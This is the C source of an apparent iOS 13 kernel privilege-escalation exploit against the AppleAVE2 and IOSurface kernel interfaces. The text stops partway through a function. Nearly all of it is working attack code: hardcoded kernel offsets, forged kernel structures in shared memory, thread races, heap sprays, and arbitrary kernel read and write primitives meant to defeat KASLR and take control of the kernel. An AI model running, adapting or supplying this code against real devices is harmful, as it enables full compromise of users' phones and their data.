//
//  ios13_kernel_universal.c
//  ios13_app1
//
//  Created by bb on 1/12/20.
//  Copyright © 2020 bb. All rights reserved.
//

// Update* For 13.4/13.4.1 Support
// Update* For 13.6/13.6.1 Support
// Update* For 13.7 Support

#include <stdio.h>
#include <setjmp.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <sys/sysctl.h>
#include <mach/mach.h>
#include <mach/thread_act.h>
#include <mach/semaphore.h>
#include <mach/mach_traps.h>
#include <mach/thread_status.h>
#include <pthread/pthread.h>
#include <IOSurface/IOSurfaceRef.h>
#include <copyfile.h>
#include <dirent.h>
#include <mach-o/dyld.h>
#include <sys/stat.h>
#include <dlfcn.h>
#include "IOKitLib.h"
#include <mach-o/nlist.h>
#include <mach-o/getsect.h>
#include <spawn.h>

extern char **environ;

#if 0
#define debugPrint(x, ...) printf(x, __VA_ARGS__)
#else
#define debugPrint(x, ...)
#endif
#define errorPrint(x, ...) fprintf(stderr, x, __VA_ARGS__)

// HARDCODED offsets used in kernel
static uint32_t OFFSET_bsd_info_pid = 0x68; // +0x68:  bsd_info->pid
static uint32_t OFFSET_bsd_info_task = 0x10; // +0x10:  bsd_info->task

static uint32_t OFFSET_task_ref_count = 0x10;
static uint32_t OFFSET_task_active = 0x14;
static uint32_t OFFSET_task_message_app_suspended = 0x1C;
static uint32_t OFFSET_task_vm_map = 0x28; // +0x28: task->vm_map (ios13.x)
static uint32_t OFFSET_task_next = 0x30;
static uint32_t OFFSET_task_prev = 0x38;
static uint32_t OFFSET_task_itk_space = 0x320;
#if __arm64e__
static uint32_t OFFSET_task_bsd_info = 0x388;
#else
static uint32_t OFFSET_task_bsd_info = 0x380;
#endif

static uint32_t OFFSET_ipc_port_io_references = 0x04;
static uint32_t OFFSET_ipc_port_ip_receiver = 0x60;
static uint32_t OFFSET_ipc_port_ip_srights = 0xa0;
static uint32_t OFFSET_ipc_port_ip_kobject = 0x68;

static uint32_t OFFSET_ipc_space_is_table = 0x20;

static jmp_buf reattempt_jmpb;

#define IO_BITS_KOBJECT     0x00000800
#define IO_ACTIVE      0x80000000

#define IKOT_NONE               0
#define IKOT_TASK               2
#define IKOT_HOST               3
#define IKOT_HOST_PRIV          4

#define IE_BITS_SEND (1<<16)
#define IE_BITS_RECEIVE (1<<17)

enum
{
    kOSSerializeDictionary      = 0x01000000U,
    kOSSerializeArray           = 0x02000000U,
    kOSSerializeSet             = 0x03000000U,
    kOSSerializeNumber          = 0x04000000U,
    kOSSerializeSymbol          = 0x08000000U,
    kOSSerializeString          = 0x09000000U,
    kOSSerializeData            = 0x0a000000U,
    kOSSerializeBoolean         = 0x0b000000U,
    kOSSerializeObject          = 0x0c000000U,
    
    kOSSerializeTypeMask        = 0x7F000000U,
    kOSSerializeDataMask        = 0x00FFFFFFU,
    
    kOSSerializeEndCollection   = 0x80000000U,
    
    kOSSerializeMagic           = 0x000000d3U,
};

extern void Send_overwritting_iosurfaceMap(uint64_t remote_map_addr, uint64_t *local_map_addr);
extern void Send_notify_msg(void);

static pthread_attr_t pth_commAttr = {0};
static void pth_commAttr_init(){
    pthread_attr_init(&pth_commAttr);
    pthread_attr_setdetachstate(&pth_commAttr, PTHREAD_CREATE_DETACHED);
}

static bool check_num_stringlizability_4bytes(uint32_t input_num){
    char *stringlize = (char*)&input_num;
    if(stringlize[0] == '\0')
        return false;
    if(stringlize[1] == '\0')
        return false;
    return true;
}

static void IOSurfaceRootUserClient_remove_surface_map(io_connect_t ioconn, uint32_t surfaceId){
    // Release the surface
    uint64_t input_sca = surfaceId;
    IOConnectCallScalarMethod(ioconn, 1, &input_sca, 1, NULL, NULL);
}

static uint32_t IOSurfaceRootUserClient_create_surface_map(io_connect_t ioconn, uint64_t *remote_map_addr, uint32_t *remote_map_size){
    
    uint32_t dict_create[] =
    {
        kOSSerializeMagic,
        kOSSerializeEndCollection | kOSSerializeDictionary | 1,
        
        kOSSerializeSymbol | 19,
        0x75534f49, 0x63616672, 0x6c6c4165, 0x6953636f, 0x657a, // "IOSurfaceAllocSize"
        kOSSerializeEndCollection | kOSSerializeNumber | 32,
        0x4000000, //Need be equal or greater than 0x25BA8 ref: AVE ERROR: IOSurfaceBufferInitInfo->Size() bad
        0x0,
    };
    
    size_t output_stru_size = 0xDD0; // A fixed size
    char *output_stru = calloc(1, output_stru_size);
    int kr = IOConnectCallStructMethod(ioconn, 0, dict_create, sizeof(dict_create), output_stru, &output_stru_size);
    if(!kr){
        uint64_t ret_addr1 = *(uint64_t*)output_stru;
        //uint64_t ret_addr2 = *(uint64_t*)(output_stru + 8); // Read-only mapping from kernel
        //uint64_t ret_addr3 = *(uint64_t*)(output_stru + 0x10); // Read-only mapping from kernel
        // These are unused values here, you can deleted them.
        
        uint32_t ret_addr1_size = *(uint32_t*)(output_stru + 0x1C); // Must be uint32_t length here
        
        *remote_map_addr = ret_addr1;
        *remote_map_size = ret_addr1_size;
        
        return *(uint32_t*)(output_stru+0x18); //Output: Surface ID
    }
    return 0;
}

#pragma mark --- TFP0 Kernel Memory R/W Components ---

static uint64_t allproc_kAddr = 0;
uint32_t tfp0_port = 0;
static jmp_buf reattempt_jmpb;

static uint32_t new_reading_primitive(uint64_t target_addr);
/*static uint8_t KernelRead_1byte(uint64_t rAddr){
    if(tfp0_port){
        uint8_t retdata = 0;
        vm_size_t outsize = 0x1;
        vm_read_overwrite(tfp0_port, rAddr, 0x1, (vm_address_t)&retdata, &outsize);
        return retdata;
    }
    return (uint8_t)new_reading_primitive(rAddr);
}

static uint16_t KernelRead_2bytes(uint64_t rAddr){
    if(tfp0_port){
        uint16_t retdata = 0;
        vm_size_t outsize = 0x2;
        vm_read_overwrite(tfp0_port, rAddr, 0x2, (vm_address_t)&retdata, &outsize);
        return retdata;
    }
    return (uint16_t)new_reading_primitive(rAddr);
}*/

static uint32_t KernelRead_4bytes(uint64_t rAddr){
    if(tfp0_port){
        uint32_t retdata = 0;
        vm_size_t outsize = 0x4;
        vm_read_overwrite(tfp0_port, rAddr, 0x4, (vm_address_t)&retdata, &outsize);
        return retdata;
    }
    return new_reading_primitive(rAddr);
}

static uint64_t KernelRead_8bytes(uint64_t rAddr){
    if(tfp0_port){
        uint64_t retdata = 0;
        vm_size_t outsize = 0x8;
        vm_read_overwrite(tfp0_port, rAddr, 0x8, (vm_address_t)&retdata, &outsize);
        return retdata;
    }
    uint32_t low_32bit = new_reading_primitive(rAddr);
    uint32_t high_32bit = new_reading_primitive(rAddr + 4);
    return (uint64_t)((((uint64_t)high_32bit) << 32) | low_32bit);
}

static void new_writing_primi(uint64_t target_addr, uint32_t write_data);
/*static void KernelWrite_1byte(uint64_t wAddr, uint8_t wData){
    if(tfp0_port){
        vm_write(tfp0_port, wAddr, (vm_offset_t)&wData, 0x1);
        return;
    }
    uint32_t read_data = KernelRead_4bytes(wAddr);
    *(uint8_t*)(&read_data) = wData;
    new_writing_primi(wAddr, read_data);
}

static void KernelWrite_2bytes(uint64_t wAddr, uint16_t wData){
    if(tfp0_port){
        vm_write(tfp0_port, wAddr, (vm_offset_t)&wData, 0x2);
        return;
    }
    uint32_t read_data = KernelRead_4bytes(wAddr);
    *(uint16_t*)(&read_data) = wData;
    new_writing_primi(wAddr, read_data);
}*/

static void KernelWrite_4bytes(uint64_t wAddr, uint32_t wData){
    if(tfp0_port){
        vm_write(tfp0_port, wAddr, (vm_offset_t)&wData, 0x4);
        return;
    }
    new_writing_primi(wAddr, wData);
}

static void KernelWrite_8bytes(uint64_t wAddr, uint64_t wData){
    if(tfp0_port){
        vm_write(tfp0_port, wAddr, (vm_offset_t)&wData, 0x8);
        return;
    }
    KernelWrite_4bytes(wAddr, (uint32_t)wData);
    KernelWrite_4bytes(wAddr + 4, (uint32_t)(wData >> 32));
}

#pragma mark --- Kernel Exploitation Start ---

static io_connect_t AppleAVE2UserClient_ioconn;
static io_connect_t IOSurfaceRootUserClient_ioconn;

static char *inputmap_InitInfo = NULL;
static uint32_t InitInfo_surfaceId = 0;

static uint64_t kObject_AppleAVE2Driver = 0;
static uint64_t kObject_IOSurface = 0;

static uint64_t our_task_kAddr = 0;
uint64_t our_proc_kAddr = 0;
uint64_t kernel_proc_kAddr = 0;

void kernel_exp_start(io_connect_t ave_ioconn, io_connect_t surface_ioconn){
    pth_commAttr_init();
    
    AppleAVE2UserClient_ioconn = ave_ioconn;
    IOSurfaceRootUserClient_ioconn = surface_ioconn;
    
    extern void ios13_kernel_pwn(io_connect_t ioconn, io_connect_t surface_ioconn);
    ios13_kernel_pwn(ave_ioconn, surface_ioconn);
}

static void race_kmem2(){
    uint64_t *alert1 = (uint64_t*)(inputmap_InitInfo + 1072);
    uint32_t *action1 = (uint32_t*)(inputmap_InitInfo + 4);
    while(*alert1 == 0){}
    *action1 = 0;
}

static uint64_t alloc_kernel_40_mem(){
    
    uint64_t user_iosurfaceinfo_buf;
    
    *(uint32_t*)(inputmap_InitInfo + 13344) = 1;
    *(uint32_t*)(inputmap_InitInfo + 13368) = 1;
    *(uint32_t*)(inputmap_InitInfo + 2020) = 160;
    *(uint32_t*)(inputmap_InitInfo + 2024) = 64;
    
    *(uint32_t*)(inputmap_InitInfo + 0x10) = 0x4569;
    *(uint32_t*)(inputmap_InitInfo + 12) = 5;
    
    *(uint32_t*)(inputmap_InitInfo + 96) = 1; // Skip code at: if ( *(_DWORD *)&clientbuf->inputmap_InitInfo_block1[96] != 1 )
    *(uint8_t*)(inputmap_InitInfo + 13477) = 0; // disable kernel_debug
    *(uint64_t*)(inputmap_InitInfo + 5936) = 0;
    
    {
        char *input_stru = calloc(1, 0x28);
        *(uint32_t*)(input_stru + 8) = 0; // offset of inputmap_FrameInfo, godamn, cool feature
        *(uint32_t*)(input_stru + 12) = InitInfo_surfaceId;
        
        size_t output_stru_size = 0x4;
        char *output_stru = calloc(1, output_stru_size);
        IOConnectCallStructMethod(AppleAVE2UserClient_ioconn, 6, input_stru, 0x28, output_stru, &output_stru_size);
    }
    
    user_iosurfaceinfo_buf = *(uint64_t*)(inputmap_InitInfo + 5936);
    
    return user_iosurfaceinfo_buf;
}

static void empty_kernel_40_mem(uint64_t target_addr){
    
    *(uint32_t*)(inputmap_InitInfo + 13344) = 1;
    *(uint32_t*)(inputmap_InitInfo + 13368) = 1;
    *(uint32_t*)(inputmap_InitInfo + 2020) = 160;
    *(uint32_t*)(inputmap_InitInfo + 2024) = 64;
    
    *(uint32_t*)(inputmap_InitInfo + 0x10) = 0x4569;
    *(uint32_t*)(inputmap_InitInfo + 12) = 5;
   
    *(uint32_t*)(inputmap_InitInfo + 96) = 1;
    *(uint8_t*)(inputmap_InitInfo + 13477) = 0; // disable kernel_debug
    *(uint64_t*)(inputmap_InitInfo + 5936) = target_addr;
    
    {
        char *input_stru = calloc(1, 0x28);
        *(uint32_t*)(input_stru + 8) = 0;
        *(uint32_t*)(input_stru + 12) = InitInfo_surfaceId;
        
        size_t output_stru_size = 0x4;
        char *output_stru = calloc(1, output_stru_size);
        IOConnectCallStructMethod(AppleAVE2UserClient_ioconn, 6, input_stru, 0x28, output_stru, &output_stru_size);
    }
}

static uint64_t alloc_kernel_40_mem_contains_iosurfacebuf(){
    
    uint64_t user_iosurfaceinfo_buf;
    
    *(uint32_t*)(inputmap_InitInfo + 13344) = 1;
    *(uint32_t*)(inputmap_InitInfo + 13368) = 1;
    
    *(uint32_t*)(inputmap_InitInfo + 0x10) = 0x4569;
    *(uint32_t*)(inputmap_InitInfo + 12) = 0;
   
    *(uint32_t*)(inputmap_InitInfo + 96) = 1;
    *(uint8_t*)(inputmap_InitInfo + 13477) = 0;
    
    *(uint32_t*)(inputmap_InitInfo + 4) = 0x333;
    
    {
        char *input_stru = calloc(1, 0x28);
        *(uint32_t*)(input_stru + 8) = 0;
        *(uint32_t*)(input_stru + 12) = InitInfo_surfaceId;
        
        size_t output_stru_size = 0x4;
        char *output_stru = calloc(1, output_stru_size);
        IOConnectCallStructMethod(AppleAVE2UserClient_ioconn, 6, input_stru, 0x28, output_stru, &output_stru_size);
    }
    
    *(uint32_t*)(inputmap_InitInfo + 4) = 0x1; // this effect 40_mem_destroy, so must set back
    
    user_iosurfaceinfo_buf = *(uint64_t*)(inputmap_InitInfo + 5936);
    
    return user_iosurfaceinfo_buf;
}

static void release_kernel_40_mem(uint64_t user_iosurfaceinfo_buf){
    
    *(uint32_t*)(inputmap_InitInfo + 4) = 0;
    *(uint32_t*)(inputmap_InitInfo + 13344) = 1;
    *(uint32_t*)(inputmap_InitInfo + 13368) = 1;
   
    *(uint32_t*)(inputmap_InitInfo + 0x10) = 0x4569;
    *(uint32_t*)(inputmap_InitInfo + 12) = 0;
    
    *(uint32_t*)(inputmap_InitInfo + 96) = 1;
    *(uint8_t*)(inputmap_InitInfo + 13477) = 0;
    *(uint64_t*)(inputmap_InitInfo + 5936) = user_iosurfaceinfo_buf;
    
    char *input_stru = calloc(1, 0x28);
    *(uint32_t*)(input_stru + 8) = 0;
    *(uint32_t*)(input_stru + 12) = InitInfo_surfaceId;
    
    size_t output_stru_size = 0x4;
    char *output_stru = calloc(1, output_stru_size);
    
    IOConnectCallStructMethod(AppleAVE2UserClient_ioconn, 6, input_stru, 0x28, output_stru, &output_stru_size);
    
    if(*(uint64_t*)(inputmap_InitInfo + 5936)){
        errorPrint("%s", "release_kernel_40_mem failure detected....reattemping\n");
        longjmp(reattempt_jmpb, 1);
    }
}

static void IOSurfaceRootUserClient_sRemoveValue(uint32_t spray_id, uint32_t key){
    
    uint32_t input_stru[3] = {0};
    input_stru[0] = spray_id;
    input_stru[1] = 0;
    input_stru[2] = key;
    
    size_t output_stru_size = 4;
    uint32_t output_stru = 0;
    
    IOConnectCallStructMethod(IOSurfaceRootUserClient_ioconn, 11, input_stru, sizeof(input_stru), &output_stru, &output_stru_size);
}

static char *www_output_stru = NULL;
static char *IOSurfaceRootUserClient_sCopyValue(uint32_t spray_id, uint32_t lookup_key){
    
    uint32_t input_stru[3] = {0};
    input_stru[0] = spray_id;
    input_stru[1] = 0;
    input_stru[2] = lookup_key;
    
    size_t output_stru_size = 5000;
    if(!www_output_stru)
        www_output_stru = malloc(output_stru_size);
    bzero(www_output_stru, output_stru_size);
    
    int kr = IOConnectCallStructMethod(IOSurfaceRootUserClient_ioconn, 10, input_stru, sizeof(input_stru), www_output_stru, &output_stru_size);
    if(kr){
        printf("lookup_key: 0x%x IOSurfaceRootUserClient_sCopyValue failure: 0x%x\n", lookup_key, kr);
        return NULL;
    }
    
    return www_output_stru;
}

static uint64_t magic_addr = 0;

static uint64_t _temp_kernel_reading_mapOffset = 0x30000;
static uint8_t _temp_kernel_reading_semaphore = 0;
static uint64_t _temp_kernel_reading_target_addr = 0;

static void _temp_kernel_reading_categ3_threadFunc(){
    
    uint64_t precalc_value1 = magic_addr + _temp_kernel_reading_mapOffset; // input_shit
    uint64_t precalc_value2 = _temp_kernel_reading_target_addr - 64;
    uint64_t backup_iosurfacebuf = 0;
    
    uint64_t *alert1 = (uint64_t*)(inputmap_InitInfo + 1096);
    uint64_t *alert2 = (uint64_t*)(inputmap_InitInfo + _temp_kernel_reading_mapOffset); // input_shit->ptr
    uint64_t *alert3 = (uint64_t*)(inputmap_InitInfo + 56);
    
    _temp_kernel_reading_semaphore = 1; // Ready
    
    while(!*alert1){if(!_temp_kernel_reading_semaphore) return;}
    *(uint64_t*)(inputmap_InitInfo + 5936) = precalc_value1;
    
    while(!*alert2){if(!_temp_kernel_reading_semaphore) return;}
    backup_iosurfacebuf = *alert2;
    *alert2 = precalc_value2;
    *(uint64_t*)(inputmap_InitInfo + 5936) = 0;
    
    while(!*alert3){if(!_temp_kernel_reading_semaphore) return;}
    *alert2 = 0;//backup_iosurfacebuf;
    *(uint64_t*)(inputmap_InitInfo + 5936) = 0;
}

static uint32_t temp_kernel_reading_categ3(uint64_t target_addr){
    
    int kr = 0;
    uint32_t retdata = 0;
    do{
        //*(uint32_t*)(inputmap_InitInfo + 4) = 99;
        *(uint64_t*)(inputmap_InitInfo + 56) = 0;
        *(uint64_t*)(inputmap_InitInfo + 1096) = 0;
        *(uint64_t*)(inputmap_InitInfo + 5936) = 0;
        
        *(uint64_t*)(inputmap_InitInfo + _temp_kernel_reading_mapOffset) = 0; // input_shit
        
        _temp_kernel_reading_target_addr = target_addr;
        _temp_kernel_reading_semaphore = 0;
        pthread_t ph = NULL;
        pthread_create(&ph, NULL, (void*)_temp_kernel_reading_categ3_threadFunc, NULL);
        while(!_temp_kernel_reading_semaphore){};
        
        *(uint32_t*)(inputmap_InitInfo + 0x10) = 0x4569; // InfoType
        *(uint32_t*)(inputmap_InitInfo + 12) = 0; // To cause AVE ERROR: multiPassEndPassCounterWFR *Can use for early return
        // or cause unmap later in IMG_V_EncodeAndSendFrame
        
        *(uint32_t*)(inputmap_InitInfo + 96) = 1; // Skip code at: if ( *(_DWORD *)&clientbuf->inputmap_InitInfo_block1[96] != 1 )
        *(uint8_t*)(inputmap_InitInfo + 13477) = 0; // disable kernel_debug
        *(uint64_t*)(inputmap_InitInfo + 5936) = magic_addr + 0x30000 - 0x28; // point to a unused addr
        {
            char input_stru[0x28] = {0};
            *(uint32_t*)(input_stru + 8) = 0;
            *(uint32_t*)(input_stru + 12) = InitInfo_surfaceId;
            
            size_t output_stru_size = 0x4;
            uint32_t output_stru = 0;
            IOConnectCallStructMethod(AppleAVE2UserClient_ioconn, 6, input_stru, 0x28, &output_stru, &output_stru_size);
        }
        _temp_kernel_reading_semaphore = 0;
        pthread_join(ph, NULL);
        
        
        uint32_t *alert3 = (uint32_t*)(inputmap_InitInfo + _temp_kernel_reading_mapOffset + 16);
        if(*alert3){
            //(printf)("temp_kernel_reading_bypass_kaslr: 0x%x\n", *alert3);
            retdata = *alert3;
            //break;
        }
        
        _temp_kernel_reading_mapOffset = _temp_kernel_reading_mapOffset + 16;
        *(uint64_t*)(inputmap_InitInfo + 5936) = 0;
        //retdata = *(uint64_t*)(inputmap_InitInfo + 56);
        
    }while(!retdata || kr);
    
    //complete_frame(0); // mmm
    return retdata;
}

static void _temp_kernel_reading_bypass_kaslr_threadFunc(){
    
    uint64_t precalc_value1 = magic_addr + _temp_kernel_reading_mapOffset; // input_shit
    uint64_t precalc_value2 = _temp_kernel_reading_target_addr - 24;
    uint64_t backup_iosurfacebuf = 0;
    
    uint64_t *alert1 = (uint64_t*)(inputmap_InitInfo + 1096);
    uint64_t *alert2 = (uint64_t*)(inputmap_InitInfo + _temp_kernel_reading_mapOffset); // input_shit->ptr
    uint64_t *alert3 = (uint64_t*)(inputmap_InitInfo + 56);
    
    _temp_kernel_reading_semaphore = 1; // Ready
    
    while(!*alert1){if(!_temp_kernel_reading_semaphore) return;}
    *(uint64_t*)(inputmap_InitInfo + 5936) = precalc_value1;
    
    while(!*alert2){if(!_temp_kernel_reading_semaphore) return;}
    backup_iosurfacebuf = *alert2;
    *alert2 = precalc_value2;
    *(uint64_t*)(inputmap_InitInfo + 5936) = 0;
    
    while(!*alert3){if(!_temp_kernel_reading_semaphore) return;}
    *alert2 = 0;//backup_iosurfacebuf;
    *(uint64_t*)(inputmap_InitInfo + 5936) = 0;
}

static uint32_t temp_kernel_reading_categ5(uint64_t target_addr){
    
    int kr = 0;
    uint32_t retdata = 0;
    do{
        //*(uint32_t*)(inputmap_InitInfo + 4) = 99;
        *(uint64_t*)(inputmap_InitInfo + 56) = 0;
        *(uint64_t*)(inputmap_InitInfo + 1096) = 0;
        *(uint64_t*)(inputmap_InitInfo + 5936) = 0;
        
        *(uint64_t*)(inputmap_InitInfo + _temp_kernel_reading_mapOffset) = 0; // input_shit
        
        _temp_kernel_reading_target_addr = target_addr;
        _temp_kernel_reading_semaphore = 0;
        pthread_t ph = NULL;
        pthread_create(&ph, NULL, (void*)_temp_kernel_reading_bypass_kaslr_threadFunc, NULL);
        while(!_temp_kernel_reading_semaphore){};
        
        *(uint32_t*)(inputmap_InitInfo + 0x10) = 0x4569; // InfoType
        *(uint32_t*)(inputmap_InitInfo + 12) = 0; // To cause AVE ERROR: multiPassEndPassCounterWFR *Can use for early return
        // or cause unmap later in IMG_V_EncodeAndSendFrame
        
        *(uint32_t*)(inputmap_InitInfo + 96) = 1; // Skip code at: if ( *(_DWORD *)&clientbuf->inputmap_InitInfo_block1[96] != 1 )
        *(uint8_t*)(inputmap_InitInfo + 13477) = 0; // disable kernel_debug
        *(uint64_t*)(inputmap_InitInfo + 5936) = magic_addr + 0x30000 - 0x28; // point to a unused addr
        {
            char input_stru[0x28] = {0};
            *(uint32_t*)(input_stru + 8) = 0;
            *(uint32_t*)(input_stru + 12) = InitInfo_surfaceId;
            
            size_t output_stru_size = 0x4;
            uint32_t output_stru = 0;
            IOConnectCallStructMethod(AppleAVE2UserClient_ioconn, 6, input_stru, 0x28, &output_stru, &output_stru_size);
        }
        _temp_kernel_reading_semaphore = 0;
        pthread_join(ph, NULL);
        
        
        uint32_t *alert3 = (uint32_t*)(inputmap_InitInfo + _temp_kernel_reading_mapOffset + 32);
        if(*alert3){
            retdata = *alert3;
        }
        
        _temp_kernel_reading_mapOffset = _temp_kernel_reading_mapOffset + 0x8;
        *(uint64_t*)(inputmap_InitInfo + 5936) = 0;
        
    }while(!retdata || kr);
    
    return retdata;
}

static void prep_new_reading_primi(){
    // Have to call this everytime in prior to read
    
    char *forge_clientbuf = inputmap_InitInfo + 0x24000;
    uint64_t forge_clientbuf_kaddr = magic_addr + 0x24000;
    
    char *forge_KernelFrameQueue = forge_clientbuf + 0x29B98;
    uint64_t forge_KernelFrameQueue_kaddr = forge_clientbuf_kaddr + 0x29B98;
    
    char *forge_inputmap_FrameInfo = forge_KernelFrameQueue + 24;
    uint64_t forge_inputmap_FrameInfo_kaddr = forge_KernelFrameQueue_kaddr + 24;
    
    *(uint64_t*)(forge_KernelFrameQueue + 0x10) = forge_inputmap_FrameInfo_kaddr;
    
    *(uint32_t*)(forge_clientbuf + 0x8) = 0x0;
    *(forge_clientbuf + 0x27B59) = 0x0;
    
 
    *(uint64_t*)(forge_inputmap_FrameInfo + 16) = 0x4569;
    *(uint32_t*)(forge_clientbuf + 0x4FF0 + 112) = 0x1;
    
    *(uint64_t*)(forge_clientbuf + 0x27838) = forge_inputmap_FrameInfo_kaddr + 0x2A000;
    
    *(uint64_t*)(forge_inputmap_FrameInfo + 5936) = 0;
}

static uint32_t new_reading_primitive(uint64_t target_addr){
    
    prep_new_reading_primi();
    
    char *forge_inputmap_FrameInfo = inputmap_InitInfo + 0x24000 + 0x29B98 + 24;
    uint64_t forge_inputmap_FrameInfo_kaddr = magic_addr + 0x24000 + 0x29B98 + 24;
    
    *(uint32_t*)(forge_inputmap_FrameInfo + 20) = 0x2;
    
    uint32_t *retdata = (uint32_t*)(forge_inputmap_FrameInfo + 176);
    *retdata = 0;
    
    char *m_DPB = forge_inputmap_FrameInfo + 0x2A000;
    uint64_t m_DPB_inKernel = forge_inputmap_FrameInfo_kaddr + 0x2A000;
    
    *(uint32_t*)(m_DPB + 20) = 1;
    *(uint32_t*)(m_DPB + 2364) = 0;
    
    char *v8 = m_DPB + 96*(0) + 728;
    uint64_t v8_inKernel = m_DPB_inKernel + 96*(0) + 728;
    
    *(uint64_t*)(v8 + 72) = v8_inKernel + 40;
    *(uint64_t*)(v8 + 80) = 0;
    *(uint64_t*)(v8 + 40) = v8_inKernel + 48 - 32;
    *(uint64_t*)(v8 + 48) = target_addr - 12;
    
    *(uint64_t*)(v8) = 0;
    
    *(uint32_t*)(forge_inputmap_FrameInfo + 0x10) = 0x4569;
    *(uint32_t*)(forge_inputmap_FrameInfo + 12) = 0;
    
    *(uint32_t*)(forge_inputmap_FrameInfo + 96) = 2;
    *(uint8_t*)(forge_inputmap_FrameInfo + 13477) = 0;
    *(uint64_t*)(forge_inputmap_FrameInfo + 5936) = 0;
    {
        char input_stru[0x28] = {0};
        *(uint32_t*)(input_stru + 8) = 0;
        *(uint32_t*)(input_stru + 12) = InitInfo_surfaceId;
        
        size_t output_stru_size = 0x4;
        uint32_t output_stru = 0;
        IOConnectCallStructMethod(AppleAVE2UserClient_ioconn, 6, input_stru, 0x28, &output_stru, &output_stru_size);
    }
    
    return *retdata;
}

static void new_writing_primi(uint64_t target_addr, uint32_t write_data){
    
    char *forge_clientbuf = inputmap_InitInfo + 0x24000; // 放在 magic mem + 0x24000的位置
    
    char *forge_KernelFrameQueue = forge_clientbuf + 0x29B98;
    
    //KernelFrameQueue->m_BaseAddress; // in this write prim, m_BaseAddress is the target addr we want it to be overwritten
    *(uint64_t*)(forge_KernelFrameQueue + 0x10) = target_addr - 5948;
    
    // clientbuf->UniqueClientID // in this write prim, UniqueClientID is the data we will use it to overwrite
    *(uint32_t*)(forge_clientbuf + 0x8) = write_data;
    
    {
        char *input_stru = calloc(1, 0x28);
        *(uint32_t*)(input_stru + 8) = 0; // offset of inputmap_FrameInfo, godamn, cool feature
        *(uint32_t*)(input_stru + 12) = InitInfo_surfaceId;
        
        size_t output_stru_size = 0x4;
        char *output_stru = calloc(1, output_stru_size);
        IOConnectCallStructMethod(AppleAVE2UserClient_ioconn, 6, input_stru, 0x28, output_stru, &output_stru_size);
    }
}

static size_t TT1_seria_data_totalLen = 0;
static uint32_t *TT1_seria_data_head = NULL;
static uint64_t *TT1_spraydata = NULL;
static uint32_t *TT1_seria_data_tail = NULL;

#define TT1_holes_count 20

static void Init_spraydata_for_TT1(uint32_t spray_id){
    // kalloc.48
    size_t spray_entity_size = TT1_holes_count * 112;
    TT1_seria_data_totalLen = spray_entity_size + 20 + 8; // 20/8 is head/tail for seriadata format
    TT1_seria_data_head = calloc(1, TT1_seria_data_totalLen);
    TT1_spraydata = (uint64_t *)(((char*)TT1_seria_data_head) + 20);
    TT1_seria_data_tail = (uint32_t *)(((char*)TT1_seria_data_head) + spray_entity_size + 20);
    
    memset(TT1_spraydata, 0x77, spray_entity_size);
    
    TT1_seria_data_head[0] = spray_id;
    TT1_seria_data_head[1] = 0;
    TT1_seria_data_head[2] = kOSSerializeMagic;
    TT1_seria_data_head[3] = kOSSerializeEndCollection | kOSSerializeArray | 2;
    TT1_seria_data_head[4] = kOSSerializeData | (uint32_t)spray_entity_size;
    
    TT1_seria_data_tail[0] = kOSSerializeEndCollection | kOSSerializeString | 2;
    TT1_seria_data_tail[1] = 0x1;
}

static uint32_t TT1_sprayid = 0xB201;
static void TT1_send_spray(){
    
    size_t output_stru_size = 4;
    uint32_t output_stru = 0;
    
    TT1_sprayid = TT1_sprayid + 1;
    
    // Start spraying
    for(int i=TT1_sprayid; i<(TT1_sprayid+1); i++){
        TT1_seria_data_tail[1] = i;
        if(!check_num_stringlizability_4bytes(i)) // Make sure key is valid
            continue;
        
        // IOSurfaceRootUserClient_sSetValue
        IOConnectCallStructMethod(IOSurfaceRootUserClient_ioconn, 9, TT1_seria_data_head, TT1_seria_data_totalLen, &output_stru, &output_stru_size);
    }
}

static size_t TT2_seria_data_totalLen = 0;
static uint32_t *TT2_seria_data_head = NULL;
static char *TT2_spraydata = NULL;
static uint32_t *TT2_seria_data_tail = NULL;

static void Init_spraydata_for_TT2(uint32_t spray_id){
    // kalloc.48
    size_t spray_entity_size = 112;
    TT2_seria_data_totalLen = spray_entity_size + 20 + 8; // 20/8 is head/tail for seriadata format
    TT2_seria_data_head = calloc(1, TT2_seria_data_totalLen);
    TT2_spraydata = (((char*)TT2_seria_data_head) + 20);
    TT2_seria_data_tail = (uint32_t *)(((char*)TT2_seria_data_head) + spray_entity_size + 20);
    
    memset(TT2_spraydata, 0x66, spray_entity_size);
    
    TT2_seria_data_head[0] = spray_id;
    TT2_seria_data_head[1] = 0;
    TT2_seria_data_head[2] = kOSSerializeMagic;
    TT2_seria_data_head[3] = kOSSerializeEndCollection | kOSSerializeArray | 2;
    TT2_seria_data_head[4] = kOSSerializeData | (uint32_t)spray_entity_size;
    
    TT2_seria_data_tail[0] = kOSSerializeEndCollection | kOSSerializeString | 2;
    TT2_seria_data_tail[1] = 0x1;
}

static void TT2_send_spray(){
    
    size_t output_stru_size = 4;
    uint32_t output_stru = 0;
    
    // Start spraying
    for(int i=0xD205; i<0xDC00; i++){
        *(uint32_t*)(TT2_spraydata + 0x18) = i;
        TT2_seria_data_tail[1] = i;
        if(!check_num_stringlizability_4bytes(i)) // Make sure key is valid
            continue;
        
        // IOSurfaceRootUserClient_sSetValue
        IOConnectCallStructMethod(IOSurfaceRootUserClient_ioconn, 9, TT2_seria_data_head, TT2_seria_data_totalLen, &output_stru, &output_stru_size);
    }
}

static void TT2_send_spray_smallspray(){
    
    size_t output_stru_size = 4;
    uint32_t output_stru = 0;
    
    // Start spraying
    for(int i=0xDC01; i<0xDD00; i++){
        *(uint32_t*)(TT2_spraydata + 0x18) = i;
        TT2_seria_data_tail[1] = i;
        if(!check_num_stringlizability_4bytes(i)) // Make sure key is valid
            continue;
        
        // IOSurfaceRootUserClient_sSetValue
        IOConnectCallStructMethod(IOSurfaceRootUserClient_ioconn, 9, TT2_seria_data_head, TT2_seria_data_totalLen, &output_stru, &output_stru_size);
    }
}

static void TT2_release_all(){
    
    for(int i=0xD205; i<0xDD00; i++){
        if(!check_num_stringlizability_4bytes(i)) // Make sure key is valid
            continue;
        
        IOSurfaceRootUserClient_sRemoveValue(InitInfo_surfaceId, i);
    }
}

static uint8_t add_new_client(){
    size_t input_stru_size = 0x8;
    uint64_t input_stru = 0;
    size_t output_stru_size = 0x8;
    uint32_t output_stru[2] = {0}; // Contain clientbuf->UniqueClientID
    int kr = IOConnectCallStructMethod(AppleAVE2UserClient_ioconn, 0, &input_stru, input_stru_size, output_stru, &output_stru_size);
    // For: AVE ERROR: FindUserClientInfo EnqueueGated failed
